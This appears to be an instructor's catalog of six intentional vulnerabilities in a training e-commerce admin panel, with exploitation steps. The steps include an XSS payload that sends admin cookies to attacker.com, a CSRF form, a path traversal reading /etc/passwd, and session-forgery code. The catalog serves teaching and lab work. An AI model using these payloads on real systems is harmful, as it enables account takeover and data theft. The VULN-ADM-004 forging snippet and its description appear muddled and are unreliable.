# ShopWorthy Admin — Vulnerability Catalog

> **Instructor-facing document.** Documents every intentional vulnerability in the `admin` repository.

---

## VULN-ADM-001 — Default Credentials

| Field | Detail |
|-------|--------|
| **ID** | VULN-ADM-001 |
| **Type** | Broken Authentication |
| **OWASP** | A07:2021 – Identification and Authentication Failures |
| **Severity** | Critical |
| **File** | `backend/app.py` ~lines 12-13 |

### Description
The admin panel uses default credentials (`admin/admin`) hardcoded in the source. The credentials can be overridden via environment variables, but default to plaintext values that are committed to the repository.

### Exploitation Steps
```bash
curl -c cookies.txt -X POST http://localhost:8080/admin/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"admin"}'
# Response: {"message":"ok","username":"admin"}
# Cookie jar now contains the admin session
```

---

## VULN-ADM-002 — No CSRF Protection

| Field | Detail |
|-------|--------|
| **ID** | VULN-ADM-002 |
| **Type** | Cross-Site Request Forgery (CSRF) |
| **OWASP** | A01:2021 – Broken Access Control |
| **Severity** | Medium |
| **File** | `backend/app.py` |

### Description
Flask session cookies are used for authentication but no CSRF token validation is implemented. Any page can make cross-origin requests to admin endpoints if the victim's browser has a valid session cookie.

### Exploitation Steps
Host the following HTML page and trick an admin into visiting it:

```html
<form action="http://localhost:8080/admin/api/orders/1/status" method="POST" id="f">
  <input name="status" value="cancelled">
</form>
<script>document.getElementById('f').submit()</script>
```

---

## VULN-ADM-003 — Stored XSS via Order Notes

| Field | Detail |
|-------|--------|
| **ID** | VULN-ADM-003 |
| **Type** | Cross-Site Scripting (XSS) |
| **OWASP** | A03:2021 – Injection |
| **Severity** | High |
| **File** | `frontend/src/views/OrdersView.vue` ~line 15 |

### Description
Order notes are rendered via `v-html` in the admin orders view without sanitization. An attacker who can place an order can inject HTML/JavaScript that executes when an admin views the orders page.

### Exploitation Steps
1. Place an order with malicious notes via the storefront API:
```bash
TOKEN="<customer JWT>"
curl -X POST -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"shipping_address":"123 Main St","notes":"<img src=x onerror=fetch(\"http://attacker.com/steal?c=\"+document.cookie)>"}' \
  http://localhost:4000/api/orders
```
2. The admin visits the Orders page — the XSS executes, stealing the admin session cookie

---

## VULN-ADM-004 — Broken Function-Level Authorization (Session-Only Check)

| Field | Detail |
|-------|--------|
| **ID** | VULN-ADM-004 |
| **Type** | Broken Access Control |
| **OWASP** | A01:2021 – Broken Access Control |
| **Severity** | High |
| **File** | `backend/app.py` ~lines 21-27 |

### Description
The `login_required` decorator only checks for the presence of a `session["user"]` key. It does not verify the user's role. Since Flask session contents can be read (though not forged) by a client with the session secret, and because any logged-in user passes the check, privilege escalation is possible once auth is achieved.

### Exploitation Steps
```python
import flask
# If you have the weak secret_key:
from itsdangerous import URLSafeTimedSerializer
serializer = URLSafeTimedSerializer("admin-secret")
session_data = {"user": "anyone"}
token = serializer.dumps(session_data)
# Use this as the session cookie for full admin access
```

---

## VULN-ADM-005 — Path Traversal on File Download

| Field | Detail |
|-------|--------|
| **ID** | VULN-ADM-005 |
| **Type** | Path Traversal |
| **OWASP** | A01:2021 – Broken Access Control |
| **Severity** | High |
| **File** | `backend/app.py` ~line 82 |

### Description
The `/admin/files/<path:filename>` endpoint passes the filename directly to `send_from_directory()` using a user-controlled base directory. An attacker who has admin access (or bypasses auth via VULN-ADM-004) can traverse to arbitrary files.

### Exploitation Steps
```bash
# After logging in as admin
curl -b cookies.txt "http://localhost:8080/admin/files/../../../etc/passwd"
curl -b cookies.txt "http://localhost:8080/admin/files/../../../app/app.py"
```

---

## VULN-ADM-006 — Weak Session Secret

| Field | Detail |
|-------|--------|
| **ID** | VULN-ADM-006 |
| **Type** | Broken Authentication |
| **OWASP** | A07:2021 – Identification and Authentication Failures |
| **Severity** | Medium |
| **File** | `backend/app.py` ~line 10 |

### Description
The Flask session secret key defaults to `"admin-secret"`, which is hardcoded and committed to the repository. An attacker who knows the secret key can forge session cookies for any username.

### Exploitation Steps
```python
from flask.sessions import SecureCookieSessionInterface
from flask import Flask
app = Flask(__name__)
app.secret_key = "admin-secret"

# Sign a forged session
with app.test_request_context():
    session_interface = SecureCookieSessionInterface()
    class MockApp:
        secret_key = "admin-secret"
    serializer = session_interface.get_signing_serializer(MockApp())
    forged = serializer.dumps({"user": "admin"})
    print(f"session={forged}")
```

Use the forged cookie to access any admin endpoint.
